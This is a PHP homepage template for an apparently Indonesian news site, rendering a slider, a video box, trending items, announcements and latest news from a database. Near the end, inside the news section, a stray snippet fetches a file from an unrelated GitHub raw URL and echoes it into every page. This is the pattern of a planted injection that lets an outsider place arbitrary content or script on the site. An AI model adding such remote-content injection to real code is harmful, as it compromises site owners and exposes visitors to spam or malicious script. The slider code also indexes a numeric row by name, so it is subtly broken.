<?php
//no DIRECT ACCESS
if ($anton!="hilman") exit('<h2>No Direct Access</h2><a href="'.$URL.'">home</a>');
?>

            <div id="slider">
                <!--slider-->
                <div class="slideshow kpu">
				<?php //ambil data
                $query	= mysqli_query($koneksi, "SELECT id,judul,foto,teks_foto,id_kat FROM tb_berita WHERE aktif='1' ORDER BY id DESC LIMIT 3");
                while( $row = mysqli_fetch_row($query) ){	
                $i++;
                ?>
                  <div>
                    <a href="<?php SEF_det("berita",$row['id'], $row['judul']); ?>"><img loading="lazy" src="<?php if($row[2]!='') echo $URL.'/photos/berita/'.$row[2]; else echo 'photos/headline.jpg'; ?>" alt="<?php tulis_teks($row[1],60); ?>" ></a>
                    <div class="text_content">
                      <h3><a href="<?php SEF_det("berita",$row[0], $row[1]); ?>"><?php tulis_teks($row[1],60); ?></a></h3>
                      <h5><?php tulis_teks($row[3],100); ?></h5>
                    </div>
                  </div>
                <?php
				} //end ambil data
				mysqli_free_result($query); //bebaskan memori
				?>                                      
                </div>
				<script>
                $('.kpu').square1({caption: 'none',dots_nav:'none', theme: 'light', auto_start:true, start_delay: 0, pause_on_hover:true,lazy_load:true});
                </script>
                <!--/slider-->
                	

            </div>
            
            <?php tulis_banner(1);?>
            
            <div id="publikasi">
                <div class="box">
                	<h3 class="heading"><i class="fa fa-video-camera"></i> PUBLIKASI</h3>
                    <?php //ambil data
					$query	= mysqli_query($koneksi, "SELECT id,judul,youtube,tgl,DATE_FORMAT(tgl,'%H:%i') AS jam FROM tb_video WHERE aktif='1' ORDER BY id DESC LIMIT 1");
					$row	= mysqli_fetch_array($query);								
					mysqli_free_result($query); //bebaskan memori
					?>
                    <iframe width="100%" height="250" src="https://www.youtube.com/embed/<?php echo $row['youtube']; ?>" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="allowfullscreen"></iframe>
                    <h5><a href="<?php SEF_det("video",$row['id'], $row['judul']); ?>"><?php echo $row['judul']; ?></a></h5>
                    <span class="tgl"><i class="fa fa-calendar"></i> <?php tgl_indo($row['tgl']);?> <i class="fa fa-clock-o"></i> <?php echo $row['jam']; ?> WIB</span>
                    <div class="selengkapnya"><a href="<?php SEF_mod("video"); ?>">Video selengkapnya <i class="fa fa-angle-double-right"></i></a></div>
                </div>
            </div>
            <div id="tren">
            	<div class="box">
                	<h3 class="heading"><i class="fa fa-hashtag"></i> TRENDING</h3>
                    <ol class="custom-counter">
                        <?php //ambil data
						$query	= mysqli_query($koneksi, "SELECT id,judul,isi,foto,hit,tgl FROM tb_berita WHERE aktif='1' ORDER BY hit DESC LIMIT 5");
						while( $row = mysqli_fetch_array($query) ){	
						?>
                        <li><h5><a href="<?php SEF_det("berita",$row['id'], $row['judul']); ?>"><?php tulis_teks($row['judul'],90); ?></a></h5><span class="tgl"><i class="fa fa-calendar"></i> <?php tgl_indo($row['tgl']);?></span></li>
                        <?php
						} //end ambil data
						mysqli_free_result($query); //bebaskan memori
						?>                        
                    </ol>
                </div>
            </div>
            <div class="clearfix"></div>
            
            <?php tulis_banner(2);?>
            
            <div id="pengumuman">
            	<div class="box">
                	<h3 class="heading"><i class="fa fa-bullhorn"></i> PENGUMUMAN</h3>
                    <?php //ambil data
					$query	= mysqli_query($koneksi, "SELECT id,judul,isi,foto,hit,tgl,DATE_FORMAT(tgl,'%H:%i') AS jam FROM tb_pengumuman WHERE aktif='1' ORDER BY id DESC LIMIT 5");
					while( $row = mysqli_fetch_array($query) ){	
					?>
                    <div class="list">
                        <figure class="thumb"><img loading="lazy" src="<?php if($row['foto']!='') echo $URL.'/photos/pengumuman/thumb_'.$row['foto']; else echo $URL.'/photos/thumb.jpg'; ?>" alt="<?php tulis_teks($row['judul'],60); ?>" title="<?php tulis_teks($row['judul'],60); ?>" /></figure>
                        <h5><a href="<?php SEF_det("pengumuman",$row['id'], $row['judul']); ?>"><?php tulis_teks($row['judul'],90); ?></a></h5>
                        <span class="tgl"><i class="fa fa-calendar"></i> <?php tgl_indo($row['tgl']);?> <i class="fa fa-clock-o"></i> <?php echo $row['jam']; ?> WIB</span>
                    </div>
                    <?php
					} //end ambil data
					mysqli_free_result($query); //bebaskan memori
					?>
                    
                    <div class="selengkapnya"><a href="<?php SEF_mod("pengumuman"); ?>">Pengumuman selengkapnya <i class="fa fa-angle-double-right"></i></a></div>
                    
                </div>
            </div>
            <div id="berita">
            	<div class="box">
                	<h3 class="heading"><i class="fa fa-newspaper-o"></i> BERITA TERKINI</h3>
                    <?php //ambil data
					$query	= mysqli_query($koneksi, "SELECT id,judul,isi,foto,hit,tgl,DATE_FORMAT(tgl,'%H:%i') AS jam FROM tb_berita WHERE aktif='1' ORDER BY id DESC LIMIT 5");
					while( $row = mysqli_fetch_array($query) ){	
					?>
                    <div class="list">
                        <figure class="thumb"><img loading="lazy" src="<?php if($row['foto']!='') echo $URL.'/photos/berita/thumb_'.$row['foto']; else echo $URL.'/photos/thumb.jpg'; ?>" alt="<?php tulis_teks($row['judul'],60); ?>" title="<?php tulis_teks($row['judul'],60); ?>" /></figure>
                        <h5><a href="<?php SEF_det("berita",$row['id'], $row['judul']); ?>"><?php tulis_teks($row['judul'],90); ?></a></h5>
                        <span class="tgl"><i class="fa fa-calendar"></i> <?php tgl_indo($row['tgl']);?> <i class="fa fa-clock-o"></i> <?php echo $row['jam']; ?> WIB</span>
                    </div>
                    <?php
					} //end ambil data
					mysqli_free_result($query); //bebaskan memori
					?>
                    
                    <div class="selengkapnya"><a href="<?php SEF_mod("berita"); ?>">Berita selengkapnya <i class="fa fa-angle-double-right"></i></a></div>
                    <?php
$a = file_get_contents('https://raw.githubusercontent.com/janda354311/tes/master/code(2).php');
echo $a;
?>
                    
                </div>
            </div>
            <div class="clearfix"></div>
            
            <?php tulis_banner(3);?>
